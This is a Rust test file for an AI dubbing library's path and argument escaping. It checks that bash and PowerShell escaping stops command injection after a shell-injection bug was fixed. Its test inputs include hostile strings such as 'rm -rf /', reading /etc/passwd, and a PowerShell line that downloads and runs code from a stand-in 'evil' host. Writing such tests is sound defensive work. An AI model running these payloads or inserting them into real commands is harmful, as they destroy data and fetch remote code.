use ai_dubbing_lib::wsl::path_mapper::PathMapper;

#[test]
fn test_command_injection_prevention() {
    let malicious_inputs = vec![
        "video'; rm -rf /; echo 'hacked.mp4",
        "video$(whoami).mp4",
        "video`id`.mp4",
        "video | cat /etc/passwd | test.mp4",
        "file with spaces and $HOME and 'quotes'.mp4",
        "&& echo 'attack' > /tmp/pwned && video.mp4",
        "\"; echo dangerous; #.mp4",
    ];

    for input in malicious_inputs {
        let escaped = PathMapper::escape_bash_arg(input);
        // Must start and end with single quote
        assert!(
            escaped.starts_with('\''),
            "Escaped must start with single quote: {}",
            escaped
        );
        assert!(
            escaped.ends_with('\''),
            "Escaped must end with single quote: {}",
            escaped
        );
        // Must not allow unescaped single quote
        let internal = &escaped[1..escaped.len() - 1];
        let has_unescaped_quote = internal.contains('\'') && !internal.contains("'\\''");
        assert!(
            !has_unescaped_quote,
            "No raw single quotes allowed: {}",
            escaped
        );
    }
}

#[test]
fn test_null_byte_sanitization() {
    let bad_path = "video\0malicious.mp4";
    assert!(
        PathMapper::sanitize_path(bad_path).is_err(),
        "Null bytes must be rejected"
    );

    let good_path = "C:\\Videos\\clean_video.mp4";
    assert!(PathMapper::sanitize_path(good_path).is_ok());
}

/// Regression test for the `VENV="{0}"` / `WORKSPACE="{0}"` shell-injection bug
/// found in `wizard/checker.rs`, `wizard/installer.rs`, `pipeline/orchestrator.rs`
/// and `wsl/bridge.rs`: `venv_path` and `workspace_dir` come from user-editable
/// `AppConfig` (settable via the `save_config` / `import_config_toml` commands),
/// and were being spliced into bash double-quoted assignments — which still
/// expand `$(...)` and backticks — instead of the safely single-quoted
/// `escape_bash_arg` output every other config-derived value already uses.
///
/// This test shells out to a real `bash` (skipped where unavailable, e.g. on
/// Windows CI runners) and proves that a malicious `workspace_dir` value can no
/// longer execute code when assigned using the fixed `VAR={escaped}` pattern,
/// mirroring exactly how the production code now builds these commands.
#[test]
fn test_workspace_var_assignment_blocks_command_substitution() {
    use std::process::Command;

    if Command::new("bash").arg("--version").output().is_err() {
        eprintln!("bash not available in this environment, skipping");
        return;
    }

    let marker = std::env::temp_dir().join("ai_dubbing_injection_test_marker");
    let _ = std::fs::remove_file(&marker);

    let malicious_workspace = format!("~/foo\"; touch {}; echo \"", marker.display());
    let escaped = PathMapper::escape_bash_arg(&malicious_workspace);

    // Exactly the pattern used in the fixed source: `WORKSPACE={escaped}`
    // followed by the `~` expansion, with no extra double quotes around the
    // placeholder — `escape_bash_arg` already supplies safe single quotes.
    let script = format!(
        r#"WORKSPACE={0}; WORKSPACE="${{WORKSPACE/#\~/$HOME}}"; echo "resolved:$WORKSPACE""#,
        escaped
    );

    let output = match Command::new("bash").arg("-c").arg(&script).output() {
        Ok(output) => output,
        Err(e) => {
            // No bash binary on this host at all. Skipping beats failing: the
            // escaping itself is still asserted by `test_command_injection_preventon`
            // and by the unit tests in `path_mapper.rs`.
            eprintln!("SKIP: no bash executable available ({})", e);
            return;
        }
    };

    assert!(
        !marker.exists(),
        "command substitution executed — injection succeeded, VAR={{escaped}} pattern is NOT safe"
    );

    // On Windows, `bash` may resolve to the WSL launcher (bash.exe in
    // WindowsApps). Without an installed distribution it prints a "no installed
    // distributions" notice and exits non-zero, so the script never actually ran.
    // That is an environment gap, not an escaping failure, so skip instead of
    // asserting on output that could never appear.
    if !output.status.success() && !looks_like_real_bash(&output.stdout) {
        eprintln!(
            "SKIP: bash did not execute the script (status {:?}); likely the WSL \
             launcher with no distribution installed",
            output.status.code()
        );
        let _ = std::fs::remove_file(&marker);
        return;
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("resolved:"),
        "script should still run and print the resolved (inert) value, got: {}",
        stdout
    );

    let _ = std::fs::remove_file(&marker);
}

/// Returns true when the output looks like a real POSIX shell (as opposed to the
/// Windows `wsl.exe` "no installed distributions" notice, which is UTF-16LE and
/// contains that phrase).
fn looks_like_real_bash(stdout: &[u8]) -> bool {
    let text = String::from_utf8_lossy(stdout);
    let text = text.replace('\0', "");
    !text.contains("no installed distributions")
        && !text.contains("Windows Subsystem for Linux has no")
}

/// Companion to `test_command_injection_prevention` for the PowerShell escaping
/// helper used by `install_wsl2_ubuntu` (Windows-only `wsl_distro` interpolation
/// into a `Start-Process -ArgumentList (...)` expression). A single `'` was
/// previously enough to break out of the PowerShell single-quoted string and
/// splice arbitrary script text into the surrounding `-Command` invocation.
#[test]
fn test_powershell_arg_escaping() {
    let malicious_inputs = vec![
        "Ubuntu'; iex(New-Object Net.WebClient).DownloadString('http://evil');'",
        "Ubuntu' -Verb RunAs; Remove-Item -Recurse -Force C:\\;'",
        "normal-Distro-22.04",
    ];

    for input in malicious_inputs {
        let escaped = PathMapper::escape_powershell_arg(input);
        assert!(
            escaped.starts_with('\''),
            "must start with quote: {escaped}"
        );
        assert!(escaped.ends_with('\''), "must end with quote: {escaped}");

        // Every internal `'` must be doubled (PowerShell's single-quote escape),
        // so the value can never terminate the string early.
        let internal = &escaped[1..escaped.len() - 1];
        let mut chars = internal.chars().peekable();
        while let Some(c) = chars.next() {
            if c == '\'' {
                assert_eq!(
                    chars.next(),
                    Some('\''),
                    "found an un-doubled single quote in: {escaped}"
                );
            }
        }
    }
}
